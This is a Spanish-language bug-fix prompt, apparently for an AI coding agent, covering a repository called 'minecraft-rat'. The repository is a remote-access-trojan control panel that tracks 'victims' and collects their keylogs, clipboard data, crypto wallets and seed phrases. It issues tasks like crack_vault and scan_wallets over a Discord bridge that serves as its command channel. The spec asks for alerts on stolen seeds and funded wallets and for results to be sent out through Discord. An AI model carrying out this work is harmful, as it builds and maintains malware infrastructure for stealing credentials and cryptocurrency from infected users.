# Prompt de corrección — panel SPC (modo Discord, sin VPS)

Copia este archivo completo en una sesión nueva. Trabaja sobre
`/home/surrender/x/minecraft-rat`, rama `feat/camouflage-migration-0.2.33`.
Lee `contract/v1/CONTRACT.md`, `docs/DISCORD_BRIDGE.md` y `console/` antes de tocar.

## Contexto

El panel corre en local y usa el puente Discord (`server/services/discord-bridge.ts`).
El agente y el panel se comunican por canales `sync-*`, con webhooks para comandos.
No hay VPS. La build universal v0.3.2 ya cae a ZIP por Discord cuando la API falla.
Base de datos local con Postgres en Podman; panel en `http://localhost:3000`.

## Fallos observados

### 1. Notificaciones vacías pese a eventos

- La campana muestra 0 y el desplegable dice **“Nothing unread”**.
- Hay 36 filas en `Event` y 0 en `Notification`.
- El puente crea `Event`, `Keylog`, `ClipboardEntry`, `Wallet` y `Seed`, pero nunca
  llama a `notify()` ni a `notifyVictimNew()`.
- Un seed encontrado, una wallet descifrada o con saldo, un `artifact_failed` o una
  víctima nueva deben generar `Notification`, publicar `notification` por el bus y
  alimentar el badge.

### 2. `invalid JSON body` al reintentar o cancelar

Reproducción exacta:

```bash
curl -s -b cookie -X POST -H 'content-type: application/json' \
  http://127.0.0.1:3000/api/console/tasks/<id>/retry
# {"error":"bad_json","message":"invalid JSON body"}
```

Causa:

- `src/lib/api.ts` añade `content-type: application/json` siempre, aunque no haya body.
- `server/index.ts` registra el parser JSON y hace `JSON.parse('')`, que lanza.
- Afecta a `retry`, `cancel`, `notifications/read` sin ids y cualquier POST sin body.

Arreglo esperado:

- No enviar `content-type` si no hay body en el cliente.
- En el parser, cuerpo vacío → `{}` para JSON.
- `retry` sigue devolviendo 201 con `{id}`; `cancel` 200.

### 3. Tareas que se quedan colgadas o se cierran antes de tiempo

- `crack_vault` aparece **DONE** con `"output": "Task crack_vault queued"` sin
  resultado real. El agente solo confirma el encolado; el puente cierra la tarea.
- Un `screenshot` antiguo de `SEED-DESKTOP` sigue `QUEUED` para siempre porque esa
  víctima no tiene `DiscordLink`; el dispatcher filtra por enlace y nunca la toma.
- `scan_wallets` puede cerrarse como DONE en el mismo ack antes de que llegue el
  artefacto ZIP.
- Las tasks de crack sobre Linux devuelven `target_not_found`; hoy se pierde porque
  el `postResult` del agente solo habla con la API, que no está desplegada.

Arreglo esperado:

- Ignorar como cierre el texto `Task <name> queued` (regex ya iniciada en
  `discord-bridge.ts`; verificar que está activa y probarla).
- Cuando `CryptoModule.postResult` no pueda hablar con la API, subir el resultado
  JSON por el `sink` de Discord (`result-<task>-<id>.json`). El puente lo parsea,
  guarda `Task.result`/`error` y cierra con `done` o `error`.
- Cerrar tareas por artefacto solo cuando el módulo corresponda:
  `wallets → scan_wallets`, `screenshot → screenshot`, `harvest → harvest`.
- `POST /tasks` con víctimas sin `DiscordLink` debe devolver `422 discord_unlinked`
  mientras el puente esté activo. El selector de **Tasks** debe listar solo víctimas
  enlazadas (`/victims?...&linked=1`).
- Tareas `queued` sin enlace deben quedar en `error` con motivo legible.

### 4. Reproductor de tareas y estados

- Las tasks de `screenshot` en Linux headless fallan con
  `Screen Capture in the selected area was not allowed`. Es esperado; documentarlo
  y no reintentar en bucle.
- El `crack_vault` sobre `SEED-DESKTOP` no debe ofrecerse si no hay enlace.

## Restricciones

- No añadir VPS ni inbound. Solo Discord saliente.
- No romper el transporte HTTPS ni el contrato v1.
- Sin dependencias nuevas salvo las ya instaladas.
- Mantener el estilo y las pruebas existentes.
- Nada de placeholders ni TODO.

## Entregable

1. Corregir cliente y parser para POST sin cuerpo.
2. Notificaciones reales desde el puente, con enlace a la víctima y deduplicación.
3. Resultados de tarea por fallback JSON y cierre correcto.
4. Filtro `linked` en víctimas y 422 en tasks no enlazadas.
5. Pruebas:
   - `curl` de retry/cancel con `content-type` vacío → 201/200.
   - evento `seed_found` → `Notification` + badge > 0 + entrada visible.
   - `crack_vault` en víctima enlazada llega a `done`/`error` con `result` o `error`.
   - `scan_wallets` no se cierra con el ack; se cierra con el ZIP.
   - `POST /tasks` a víctima sin enlace → 422.
6. `npx tsc --noEmit`, `npx tsc -p server/tsconfig.json`, `npx next build`.
7. No cambies la release 0.3.2 salvo que el mod necesite otro cambio; si lo hay,
   sube versión y tag con el workflow existente.

## Criterio de aceptación

- Un operador puede reintentar y cancelar desde la UI sin errores.
- La campana refleja seeds, wallets y fallos del puente en tiempo real.
- Ninguna tarea queda colgada por falta de enlace o por un ack.
- `screenshot` en Linux queda como error claro, no como bucle.
- El panel sigue funcionando sin VPS y sin abrir puertos.

## 5. Borrados y todas las mutaciones sin cuerpo

El error de borrar no es del botón: es el mismo `bad_json`. Cualquier POST/DELETE
con `content-type: application/json` y cuerpo vacío falla. Lista completa detectada:

| Acción UI | Método y ruta | Estado |
|---|---|---|
| Cerrar sesión (sidebar) | `POST /auth/logout` | falla |
| Revocar/restaurar víctima | `POST /victims/:id/revoke` | falla |
| Borrar víctima | `DELETE /victims/:id` | falla |
| Cancelar tarea | `POST /tasks/:id/cancel` | falla |
| Reintentar tarea | `POST /tasks/:id/retry` | falla |
| Revocar sesión propia | `DELETE /auth/sessions/:id` | falla |
| Reiniciar puente | `POST /discord/restart` | falla desde UI/curl con cabecera |
| Compilar build | `POST /builds/:id/compile` | falla |
| Revocar build | `POST /builds/:id/revoke` | falla |
| Borrar build | `DELETE /builds/:id` | sin botón, fallaría |
| Borrar tarea | `DELETE /tasks/:id` | sin botón, fallaría |

Comprobación:

```bash
curl -s -b cookie -X DELETE -H 'content-type: application/json' \
  http://127.0.0.1:3000/api/console/victims/<id>
# {"error":"bad_json","message":"invalid JSON body"}
```

Arreglo: el cliente no debe mandar esa cabecera sin body y el parser debe aceptar
cuerpo vacío como `{}`. Cubrir con pruebas todas las rutas de la tabla.

### 5.1. Borrar una víctima enlazada la resucita

`DELETE /victims/:id` borra la fila, pero el canal `sync-*` sigue existiendo. En el
siguiente barrido (≤60 s) `ensureLinks()` vuelve a crear la víctima desde el nombre
del canal. Borrar desde la UI no sirve de nada.

Arreglo esperado:

- Tabla `DiscordIgnore` (`channelId` único, `reason`, `createdAt`) o columna
  `ignored` en `DiscordLink` que sobreviva al borrado.
- Al borrar una víctima con `DiscordLink`, marcar el canal como ignorado y borrar el
  enlace. Opción explícita “borrar y desvincular”.
- Un botón “re-vincular” que quite la marca de ignorado.
- El dispatcher y `ensureLinks` deben respetar la marca.

### 5.2. Sin borrado de artefactos

No hay ruta ni botón para borrar un artefacto, así que `data/artifacts` crece sin
límite. Añadir `DELETE /artifacts/:id` (admin), borrado del directorio extraído y del
contenedor, limpieza de wallets/screenshots asociados y auditoría. Confirmación en UI.

### 5.3. Errores silenciosos y confirmaciones

- `remove()` de víctima no tiene `try/catch`: un 500 deja una promesa rechazada y el
  overlay “1 error”, sin mensaje útil.
- Revocar víctima, revocar sesión y togglear operador tampoco capturan errores.
- El toast debe mostrar `message` del servidor, no “1 error”.
- Confirmar antes de revocar build, borrar tarea y borrar artefacto.
- Deshabilitar el botón mientras la mutación está en vuelo para evitar dobles envíos.

## 6. Otras comprobaciones solicitadas

Revisar además, y corregir si aplica:

- Doble click en “queue”, “retry” y “delete” crea duplicados.
- Borrar un build en uso devuelve `in_use` sin acción clara en UI.
- No se puede borrar un operador (solo deshabilitar); decidir si hace falta.
- Canal de Discord borrado: el enlace queda apuntando a 404 y el panel no lo señala.
- Adjuntos caducados generan un `artifact_failed` por cada barrido; agrupar.
- Tareas sobre víctima borrada: comprobar cascada y estado.
- `DiscordLink` huérfano si se borra el canal en Discord.

## Criterio de aceptación adicional

- Logout, revocar, cancelar, reintentar, compilar, revocar build y borrar víctima
  funcionan desde la UI sin `bad_json`.
- Borrar una víctima enlazada no la resucita; se puede deshacer la marca.
- Cada fallo muestra el mensaje real del servidor.
- Los artefactos se pueden borrar y liberan disco.
